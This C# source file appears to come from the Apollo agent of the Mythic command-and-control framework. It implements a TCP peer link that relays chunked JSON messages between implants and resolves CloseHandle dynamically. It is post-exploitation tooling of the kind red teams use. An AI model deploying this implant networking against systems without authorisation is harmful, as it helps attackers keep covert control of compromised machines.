using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Serializers;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO.Pipes;
using System.Linq;
using System.Text;
using AI = ApolloInterop;
using ApolloInterop.Constants;
using AS = ApolloInterop.Structs.ApolloStructs;
using System.Threading;
using TTasks = System.Threading.Tasks;
using ApolloInterop.Enums.ApolloEnums;
using System.Net.Sockets;
using ApolloInterop.Classes.Api;
using ApolloInterop.Classes.Core;

namespace Apollo.Peers.TCP
{
    public class TCPPeer : AI.Classes.P2P.Peer
    {
        private AsyncTcpClient _tcpClient = null;
        private Action<object> _sendAction;
        private TTasks.Task _sendTask;
        private bool _connected = false;
        private string _partialData = "";
        private IntPtr _socketHandle = IntPtr.Zero;
        private delegate void CloseHandle(IntPtr handle);
        private CloseHandle _pCloseHandle;
        
        public TCPPeer(IAgent agent, PeerInformation info) : base(agent, info)
        {
            C2ProfileName = "tcp";
            _tcpClient = new AsyncTcpClient(info.Hostname, info.C2Profile.Parameters.Port);
            _tcpClient.ConnectionEstablished += OnConnect;
            _tcpClient.MessageReceived += OnMessageReceived;
            _tcpClient.Disconnect += OnDisconnect;
            _pCloseHandle = _agent.GetApi().GetLibraryFunction<CloseHandle>(Library.KERNEL32, "CloseHandle");
            _sendAction = (object p) =>
            {
                TcpClient c = (TcpClient)p;
                while (c.Connected && !_cts.IsCancellationRequested)
                {
                    _senderEvent.WaitOne();
                    if (!_cts.IsCancellationRequested && c.Connected && _senderQueue.TryDequeue(out byte[] result))
                    {
                        c.GetStream().BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
                    }
                }
            };
        }

        public void OnAsyncMessageSent(IAsyncResult result)
        {
            TcpClient client = (TcpClient)result.AsyncState;
            if (client.Connected && !_cts.IsCancellationRequested)
            {
                client.GetStream().EndWrite(result);
                // Potentially delete this since theoretically the sender Task does everything
                if (_senderQueue.TryDequeue(out byte[] data))
                {
                    client.GetStream().BeginWrite(data, 0, data.Length, OnAsyncMessageSent, client);
                }
            }
        }

        public override bool Connected()
        {
            return _connected;
        }

        public override bool Finished()
        {
            return _previouslyConnected && !_connected;
        }

        public void OnConnect(object sender, TcpMessageEventArgs args)
        {
            args.State = this;
            OnConnectionEstablished(sender, args);
            _sendTask = new TTasks.Task(_sendAction, args.Client);
            _sendTask.Start();
            _connected = true;
            _previouslyConnected = true;
            _socketHandle = args.Client.Client.Handle;
        }

        public void OnDisconnect(object sender, TcpMessageEventArgs args)
        {
            _cts.Cancel();
            args.Client.Close();
            _senderEvent.Set();
            _sendTask.Wait();
            _connected = false;
            base.OnDisconnect(this, args);
        }

        public void OnMessageReceived(object sender, TcpMessageEventArgs args)
        {
            string sData = Encoding.UTF8.GetString(args.Data.Data.Take(args.Data.DataLength).ToArray());
            int sDataLen = sData.Length;
            int bytesProcessed = 0;
            while (bytesProcessed < sDataLen)
            {
                int lBracket = sData.IndexOf('{');
                int rBracket = sData.IndexOf('}');
                // No left bracket
                if (lBracket == -1)
                {
                    // No left or right bracket
                    if (rBracket == -1)
                    {
                        // Middle of the packet, just append
                        _partialData += sData;
                        bytesProcessed += sData.Length;
                    }
                    else
                    {
                        // This is an ending packet, so we need to process
                        // then shift to the next
                        string d = new string(sData.Take(rBracket + 1).ToArray());
                        _partialData += d;
                        bytesProcessed += d.Length;
                        UnwrapMessage();
                        sData = new string(sData.Skip(rBracket).ToArray());
                    }
                }
                // left bracket exists, we're starting a packet
                else
                {
                    // left bracket is ahead of starting index
                    // Thus we're in the middle of a packet receipt
                    if (lBracket > 0)
                    {
                        string d = new string(sData.Take(lBracket).ToArray());
                        _partialData += d;
                        UnwrapMessage();
                        bytesProcessed += d.Length;
                        sData = new string(sData.Skip(d.Length).ToArray());
                        // true start of a new packet
                    }
                    else
                    {
                        // No ending delimiter, will need to wait for more
                        if (rBracket == -1)
                        {
                            _partialData += sData;
                            bytesProcessed += sData.Length;
                        }
                        // Ending delimiter - time to unwrap singleton
                        else
                        {
                            string d = new string(sData.Take(rBracket + 1).ToArray());
                            _partialData += d;
                            bytesProcessed += d.Length;
                            if (d.Length < sData.Length)
                            {
                                sData = new string(sData.Skip(d.Length).ToArray());
                            }
                            UnwrapMessage();
                        }
                    }
                }
            }
        }

        private void UnwrapMessage()
        {
            AS.IPCChunkedData chunkedData = _serializer.Deserialize<AS.IPCChunkedData>(_partialData);
            _partialData = "";
            lock (_messageOrganizer)
            {
                if (!_messageOrganizer.ContainsKey(chunkedData.ID))
                {
                    _messageOrganizer[chunkedData.ID] = new ChunkedMessageStore<AS.IPCChunkedData>();
                    _messageOrganizer[chunkedData.ID].MessageComplete += DeserializeToReceiver;
                }
            }
            _messageOrganizer[chunkedData.ID].AddMessage(chunkedData);
        }

        public override bool Start()
        {
            return _tcpClient.Connect();
        }

        public override void Stop()
        {
            _cts.Cancel();
            _pCloseHandle(_socketHandle);
            _sendTask.Wait();
        }
    }
}
